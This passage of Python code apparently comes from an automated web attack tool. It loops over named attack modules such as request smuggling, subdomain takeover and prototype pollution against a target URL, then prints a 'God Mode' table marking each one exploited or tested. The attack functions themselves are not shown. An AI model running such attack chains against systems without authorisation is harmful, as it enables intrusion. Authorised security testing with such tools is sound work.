        ("HTTP Verb Tampering",    http_verb_tamper),
        ("Request Smuggling",      request_smuggling_probe),
        ("Business Logic",         business_logic_fuzz),
        ("Subdomain Takeover",     subdomain_takeover_check),
        ("Prototype Pollution",    prototype_pollution_test),
    ]

    for name, fn in attacks:
        console.print(f"  [bold cyan]▶ {name}[/bold cyan]")
        try:
            r = fn(url, output_dir)
            session_obj.add_result(r)
            results.append(r)
        except Exception as e:
            console.print(f"  [dim]  {name} error: {e}[/dim]")

    # Summary table
    exploited = [r for r in results if r.get("exploited")]
    crits = sum(len([f for f in r.get("findings", []) if f.get("severity") == "CRITICAL"]) for r in results)

    table = Table(title="God Mode — Attack Chain Results", box=box.DOUBLE_EDGE, header_style="bold red")
    table.add_column("Attack Vector", style="white", min_width=28)
    table.add_column("Status", width=14)
    table.add_column("Criticals", width=10)

    for r in results:
        crit_count = len([f for f in r.get("findings", []) if f.get("severity") == "CRITICAL"])
        status = "[bold red]EXPLOITED[/bold red]" if r.get("exploited") else "[dim]Tested[/dim]"
        crit_str = f"[bold red]{crit_count}[/bold red]" if crit_count else "-"
        table.add_row(r["module"], status, crit_str)

    console.print()
    console.print(table)
    console.print(f"\n  [bold]Exploited: {len(exploited)}/{len(results)} | Critical findings: {crits}[/bold]")

    return results
